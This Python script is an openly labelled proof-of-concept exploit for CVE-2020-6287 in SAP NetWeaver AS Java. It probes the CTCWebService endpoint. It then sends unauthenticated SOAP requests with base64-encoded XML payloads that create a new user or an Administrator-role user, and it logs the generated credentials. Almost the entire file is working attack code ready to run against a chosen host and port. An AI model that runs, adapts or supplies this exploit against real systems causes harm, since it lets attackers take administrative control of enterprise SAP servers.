import base64
import random
import requests
import argparse
import logging
from xml.etree.ElementTree import ElementTree, fromstring

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def detect_vuln(base_url, proxies, timeout):
    """Detect vulnerability by checking access to a specific path"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC"
    }
    check_path = "/CTCWebService/CTCWebServiceBean"
    expected_status = 200
    url = base_url + check_path

    try:
        response = requests.head(url, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
        if response.status_code == expected_status:
            logger.info(f"Vulnerable! [CVE-2020-6287] - Path: {url}")
            return {"status": True, "url": url}
        else:
            logger.debug(f"No vulnerability detected at {url} (status: {response.status_code})")
            return {"status": False, "url": ''}
    except requests.exceptions.RequestException as e:
        logger.error(f"Error connecting to {base_url}: {e}")
        return {"status": False, "url": ''}


def generate_user_payload(is_admin=False):
    """Generate a payload for creating a user, optionally with admin roles"""
    username = f"sapRpoc{random.randint(5000, 10000)}"
    password = f"Secure!PwD{random.randint(5000, 10000)}"
    logger.info(f"Generating payload to create user: {username}")

    if is_admin:
        rand_val = f"ThisIsRnd{random.randint(5000, 10000)}"
        payload = f'''
            <PCK>
                <Usermanagement>
                    <SAP_XI_PCK_CONFIG><roleName>Administrator</roleName></SAP_XI_PCK_CONFIG>
                    <SAP_XI_PCK_COMMUNICATION><roleName>{rand_val}</roleName></SAP_XI_PCK_COMMUNICATION>
                    <PCKUser><userName secure="true">{username}</userName><password secure="true">{password}</password></PCKUser>
                </Usermanagement>
            </PCK>
        '''
        logger.info(f"Creating admin user: {username}:{password}")
    else:
        payload = f'<root><user><JavaOrABAP>java</JavaOrABAP><username>{username}</username><password>{password}</password><userType>J</userType></user></root>'
        logger.info(f"Creating simple user: {username}:{password}")

    return base64.b64encode(payload.encode('utf-8')).decode('utf-8')


def exploit_create_user(url, proxies, timeout):
    """Exploit to create a user"""
    payload = generate_user_payload()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
        "Content-Type": "text/xml;charset=UTF-8"
    }
    xml_body = f'''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
            <soapenv:Body>
                <urn:executeSynchronious>
                    <identifier>
                        <component>sap.com/tc~lm~config~content</component>
                        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
                    </identifier>
                    <contextMessages>
                        <baData>{payload}</baData>
                        <name>userDetails</name>
                    </contextMessages>
                </urn:executeSynchronious>
            </soapenv:Body>
        </soapenv:Envelope>
    '''
    try:
        response = requests.post(url, headers=headers, proxies=proxies, timeout=timeout, data=xml_body, verify=False)
        if response.status_code == 200:
            logger.info("User creation successful!")
        else:
            logger.warning(f"Failed to create user. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error creating user: {e}")


def exploit_add_admin_role(url, proxies, timeout):
    """Exploit to create an admin user"""
    payload = generate_user_payload(is_admin=True)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
        "Content-Type": "text/xml;charset=UTF-8"
    }
    xml_body = f'''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
            <soapenv:Body>
                <urn:executeSynchronious>
                    <identifier>
                        <component>sap.com/tc~lm~config~content</component>
                        <path>content/Netweaver/PI_PCK/PCK/PCKProcess.cproc</path>
                    </identifier>
                    <contextMessages>
                        <baData>{payload}</baData>
                        <name>Netweaver.PI_PCK.PCK</name>
                    </contextMessages>
                </urn:executeSynchronious>
            </soapenv:Body>
        </soapenv:Envelope>
    '''
    try:
        response = requests.post(url, headers=headers, proxies=proxies, timeout=timeout, data=xml_body, verify=False)
        if response.status_code == 200:
            logger.info("Admin user creation successful!")
        else:
            logger.warning(f"Failed to create admin user. Status: {response.status_code}")
    except requests.exceptions.ReadTimeout:
        logger.info("Admin user creation assumed successful (ReadTimeout).")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error creating admin user: {e}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="PoC for CVE-2020-6287 - SAP NetWeaver AS JAVA Vulnerability")
    parser.add_argument('-H', '--host', default='127.0.0.1', help='Java NW host (default: 127.0.0.1)')
    parser.add_argument('-P', '--port', default=50000, type=int, help='Java NW web port (default: tcp/50000)')
    parser.add_argument('-p', '--proxy', help='Proxy (format: 127.0.0.1:8080)')
    parser.add_argument('-s', '--ssl', action='store_true', help='Enable SSL')
    parser.add_argument('-c', '--check', action='store_true', help='Detect vulnerability')
    parser.add_argument('-u', '--user', action='store_true', help='Create simple JAVA user')
    parser.add_argument('-a', '--admin', action='store_true', help='Create admin user')
    parser.add_argument('--timeout', default=10, type=int, help='Connection timeout (default: 10s)')
    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
    base_url = f"{'https' if args.ssl else 'http'}://{args.host}:{args.port}"

    if args.check:
        detect_vuln(base_url, proxies, args.timeout)
    if args.user:
        result = detect_vuln(base_url, proxies, args.timeout)
        if result["status"]:
            exploit_create_user(result["url"], proxies, args.timeout)
    if args.admin:
        result = detect_vuln(base_url, proxies, args.timeout)
        if result["status"]:
            exploit_add_admin_role(result["url"], proxies, args.timeout)
